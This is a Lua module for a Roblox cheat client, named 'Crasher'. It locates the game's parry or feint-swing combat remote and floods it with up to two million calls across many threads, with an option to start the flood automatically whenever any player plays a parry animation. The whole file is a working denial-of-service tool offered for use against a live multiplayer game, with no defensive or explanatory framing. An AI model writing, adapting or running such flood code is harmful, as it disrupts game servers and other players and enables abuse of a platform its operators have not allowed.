local Crasher
local Packets
local ThreadCount
local ParryTrigger
local running = false
local floodThreads = {}
local parryConn

local function findCombatRemote()
	local events = game:GetService('ReplicatedStorage'):FindFirstChild('GameEvents')
	local combat = events and events:FindFirstChild('CombatRemotes')
	if not combat then
		return nil
	end
	for _, r in ipairs(combat:GetChildren()) do
		if r:IsA('RemoteEvent') and r.Name:lower():find('parry') then
			return r
		end
	end
	return combat:FindFirstChild('Combat_FeintSwing')
end

local function startFlood(remote)
	if running then return end
	running = true
	local total = math.max(1, math.floor(Packets.Value))
	local per = math.max(1, math.floor(total / ThreadCount.Value))
	for i = 1, ThreadCount.Value do
		table.insert(floodThreads, task.spawn(function()
			for n = 1, per do
				if not running then return end
				remote:FireServer()
			end
		end))
	end
end

local function stopFlood()
	running = false
	floodThreads = {}
end

local function watchParries()
	local players = game:GetService('Players')
	local checked = {}
	parryConn = players.PlayerAdded:Connect(function(plr)
		task.spawn(function()
			local char = plr.Character or plr.CharacterAdded:Wait()
			local humanoid = char:WaitForChild('Humanoid', 10)
			local animator = humanoid and humanoid:FindFirstChild('Animator')
			if not animator or checked[plr] then return end
			checked[plr] = true
			animator.AnimationPlayed:Connect(function(track)
				if not running and ParryTrigger.Enabled then
					local id = tostring(track.Animation.AnimationId):lower()
					local name = tostring(track.Animation.Name):lower()
					if id:find('parry') or name:find('parry') then
						local remote = findCombatRemote()
						if remote then
							startFlood(remote)
						end
					end
				end
			end)
		end)
	end)
	for _, plr in ipairs(players:GetPlayers()) do
		task.spawn(function()
			local char = plr.Character or plr.CharacterAdded:Wait()
			local humanoid = char:WaitForChild('Humanoid', 10)
			local animator = humanoid and humanoid:FindFirstChild('Animator')
			if not animator or checked[plr] then return end
			checked[plr] = true
			animator.AnimationPlayed:Connect(function(track)
				if not running and ParryTrigger.Enabled then
					local id = tostring(track.Animation.AnimationId):lower()
					local name = tostring(track.Animation.Name):lower()
					if id:find('parry') or name:find('parry') then
						local remote = findCombatRemote()
						if remote then
							startFlood(remote)
						end
					end
				end
			end)
		end)
	end
end

Crasher = vape.Categories.Blatant:CreateModule({
	Name = 'Crasher',
	Function = function(callback)
		if callback then
			local remote = findCombatRemote()
			if not remote then
				vape:CreateNotification('Crasher', 'Combat remote not found', 3)
				return
			end
			startFlood(remote)
			watchParries()
		else
			stopFlood()
			if parryConn then
				parryConn:Disconnect()
				parryConn = nil
			end
		end
	end,
	Tooltip = 'Floods the parry remote (fallback: swing) to crash the client.'
})
Packets = Crasher:CreateSlider({
	Name = 'Packets',
	Min = 10000,
	Max = 2000000,
	Default = 2000000,
	Suffix = ''
})
ThreadCount = Crasher:CreateSlider({
	Name = 'Threads',
	Min = 1,
	Max = 16,
	Default = 8
})
ParryTrigger = Crasher:CreateToggle({
	Name = 'Trigger on parry',
	Tooltip = 'Starts the flood when someone plays a parry animation.'
})
